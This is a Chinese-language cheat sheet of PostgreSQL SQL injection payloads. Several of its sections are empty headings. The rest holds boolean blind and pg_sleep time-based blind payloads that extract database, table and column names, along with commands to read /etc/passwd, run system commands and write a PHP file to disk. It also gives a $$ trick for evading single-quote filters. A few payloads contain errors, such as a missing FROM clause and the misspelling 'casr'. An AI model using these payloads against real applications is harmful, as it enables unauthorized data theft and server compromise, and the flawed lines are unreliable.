## PostgreSQL数据库的注入
### 一、联合注入


### 二、报错注入


### 三、布尔盲注
```sql
--先猜当前数据库的长度
and (select length(current_database())) between 0 and 30

--ascii猜解库名的每个字符
and (select ascii(substr(current_database(),1,1))) between 0 and 30

---猜解数据库的表的个数
and (select count(*) from pg_stat_user_tables) between 0 and 30

--猜解库里的表名的长度
and (select length(relname) from pg_stat_user_tables limit 1 OFFSET 0) between 0 and 30

--猜解表名里面的每个字符
and (select ascii(substr(relname,1,1)) from pg_stat_user_tables limit 1 OFFSET 0) between 0 and 30

--接下来猜解字段名
and (select+ascii(substr(column_name,1,1)) information_schema.columns where table_name=aaa) between 0 and 30
```

### 四、时间盲注

### 五、PostgreSQL语法
#### 1、常用语法
```SQL
select CURRENT_SCHEMA()           #查看当前权限
select user                       #查看用户
select current_user               #查看当前用户
select chr(97)                    #将ASCII码转为字符
select chr(97)||chr(100)||chr(109)||chr(105)||chr(110)  #将ASCII转换为字符串
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
select version()                  #查看PostgreSQL数据库版本
SELECT current_database()         #查看当前数据库
select length('admin')            #查看长度
select case when(expr1) then result1 else result2 end;  #如果xx，执行result1，否则result2
例：select case when(current_user='postgres') then pg_sleep(5) else pg_sleep(0) end;
select pg_read_file('/etc/passwd');          #读取文件
select system('whoami');                     #执行系统命令,11.2以下才有该命令
COPY (select '<?php phpinfo();?>') to '/tmp/1.php';   #写入文件
```
#### 2、注意点
此数据库有一个特性，使用like查询子句时，比如：
```SQL
where aaa like '%aaa%';
```
这里单引号可以使用$$代替，如:
```SQL
where aaa like $$%aaa%$$;
```
但是暂时不知道原因！**但是可以利用这一点来逃逸单引号过滤！**
#### 3、PostgreSQL数据库的一些payload合集（注意注释符号--+）
（1）简单的有回显的SQL注入不用多说，还是基本的SQL语句直接查询就可以了。
```SQL
 #简单的payload
 parameter = 2-1
 parameter = 1 and 1 = 2
 parameter = 1 or 1 = 2-1
 parameter = 1' and '1'='1#and -> or
 parameter = 1' and '1'='2#and -> or
 ```
或者引号区分法（适用于字符串）
```SQL
 parameter = 1    #Success
 parameter = 1'   #Failed
 parameter = 1''  #Success
 ```
（2）一般的基于时间的盲注，可以参考下面的办法：
```SQL
 #postgresql 的几个简单判断payload：
 parameter=1;select pg_sleep(5)
 parameter=1';select pg_sleep(5)
 parameter=1');select pg_sleep(5)
 parameter=1);select pg_sleep(5)
 parameter=1));select pg_sleep(5)
 parameter=select pg_sleep(5)
 ```
盲注的逐位猜解
```SQL
 SELECT CASE WHEN (COALESCE(ASCII(SUBSTR(({current_user}),1,1)),0) > 100) THEN pg_sleep(14) ELSE pg_sleep(0) END LIMIT 1--+
 ```
（3）常见的函数查看一些基本信息：
```SQL
 SELECT version()     #查看版本信息
 SELECT user;        #查看用户
 SELECT current_user;
 SELECT session_user;
 SELECT usename FROM pg_user;     #这里是usename不是username
 SELECT getpgusername();
 SELECT current_database()       #查看当前数据库
 ```
（4）postgresql下的if
```SQL
 #mysql的
 if(expr1,result1,result2);
 #如果expr1满足，result1，否则result2
 
 #对于postgresql
 select case when(expr1) then result1 else result2 end;
 
 #举个例子
 select casr when(current_user='postgres') then pg_sleep(5) else pg_sleep(0) end;
```
